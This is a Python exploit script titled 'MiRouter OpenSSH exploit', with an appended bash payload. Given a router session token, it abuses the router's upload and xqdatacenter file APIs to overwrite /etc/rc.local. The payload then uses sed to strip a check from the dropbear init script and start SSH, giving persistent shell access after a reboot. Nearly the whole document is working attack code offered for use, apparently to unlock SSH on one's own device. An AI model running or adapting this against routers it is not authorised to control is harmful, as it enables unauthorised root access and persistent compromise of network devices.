import requests
import time
def main():
    Session = input("Paste your session here: ")
    #Session = '1387acc0547bc5188bc22bb811b2db9c'
    print('++++++++++++++++++++++++++++++++++++++++++++++++++')
    print('+          MiRouter OpenSSH exploit              +')
    print('+    Codez by dadadazhiliao,QQ:271607603         +')
    print('++++++++++++++++++++++++++++++++++++++++++++++++++')
    print("Prepare hacking your MiRouter")
    time.sleep(3)
    upload(Session, 'payload', '/userdisk/data')
    #print ('payload on the way.')
    for i in range(1,10):
        print('>'*i,'payload on the way',end='\r')
        time.sleep(0.3)
    filemv(Session, '/etc/rc.local', '/etc/rc.local.bak')
    for i in range(11,15):
        print('>'*i,'exploit it                ',end='\r')
        time.sleep(0.3)
    filecp(Session, '/userdisk/data/payload', '/etc/')
    for i in range(16,20):
        print('>'*i,'exploit it                ',end='\r')
        time.sleep(0.3)
    filemv(Session, '/etc/payload', '/etc/rc.local')
    for i in range(21,25):
        print('>'*i,'exploit it                ',end='\r')
        time.sleep(0.3)
    filerm(Session, '/userdisk/data/payload')
    print('>'*26,'done                ')
    print('Reboot your Router and get the ssh,enjoy :)')
    #filerm(Session, '/userdisk/data/payload')
def upload(Session,file,fpath):
    MiUrl = 'http://192.168.31.1/upload?stok=' + Session + '&secret=' + Session + '&target=' + fpath + '&targetRootPath=/'
    files = {'file': ('payload', open(file, 'rb'), 'application/octet-stream', {'Expires': '0'})}
    req = requests.post(url = MiUrl, files = files)
    #print (req.content)

def filemv(Session,mfile,dist):
    MiUrl = 'http://192.168.31.1/cgi-bin/luci/;stok=' + Session + '/api/xqdatacenter/request'
    data = {"payload":'{"api":50,"source":"' + mfile + '","target":"' + dist + '","token":"' + Session +'"}'}
    req = requests.post(MiUrl, data=data)
    #print (req.content)

def filecp(Session,mfile,distdir):
    MiUrl = 'http://192.168.31.1/cgi-bin/luci/;stok=' + Session + '/api/xqdatacenter/request'
    data = {"payload":'{"api":4,"source":"' + mfile + '","target":"' + distdir + '","token":"' + Session +'"}'}
    req = requests.post(MiUrl, data=data)
    #print (req.content)
def filerm(Session,dfile):
    MiUrl = 'http://192.168.31.1/cgi-bin/luci/;stok=' + Session + '/api/xqdatacenter/request'
    data = {"payload":'{"api":2,"path":"' + dfile + '","token":"' + Session +'"}'}
    req = requests.post(MiUrl, data=data)
    #print (req.content)
if __name__ == '__main__':
    main()
    exit()
#End


#以下是payload文件源码，bash脚本

# restore phy config
speed=$(uci -q get xiaoqiang.common.WAN_SPEED)
[ -n "$speed" ] && /usr/sbin/phyhelper swan "$speed"
sed -i ":x;N;s/if \[.*\; then\n.*return 0\n.*fi/#fuck the shit/;b x" /etc/init.d/dropbear
/etc/init.d/dropbear start
exit 0
